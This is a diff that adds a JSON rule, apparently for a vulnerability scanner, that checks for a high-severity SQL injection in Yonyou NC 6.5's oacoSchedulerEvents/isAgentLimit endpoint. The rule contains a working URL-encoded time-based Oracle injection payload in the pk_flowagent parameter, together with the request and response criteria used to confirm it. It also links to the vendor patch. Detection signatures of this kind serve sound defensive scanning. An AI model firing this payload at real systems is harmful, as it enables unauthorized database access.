@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友NC oacoSchedulerEvents接口存在sql注入漏洞",
+    "level": "高危",
+    "description": "用友NC存在SQL注入漏洞，该漏洞源于/portal/pt/oacoSchedulerEvents/isAgentLimit接口中的pk_flowagent参数存在sql注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。",
+    "product": "用友网络科技股份有限公司-NC6.5",
+    "version": "用友NC6.5",
+    "cve": "",
+    "reference": "https://mp.weixin.qq.com/s/r-4VVO8CugmtCFC0J2D0hA",
+    "fixing": "用友安全中心已发布漏洞公告，请尽快前往下载更新补丁：\nhttps://security.yonyou.com/#/noticeInfo?id=560",
+    "rule": {
+        "path": "/portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1%27%20AND%206371%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%2889%29%2C5%29--",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "xml",
+        "res_time": "5"
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
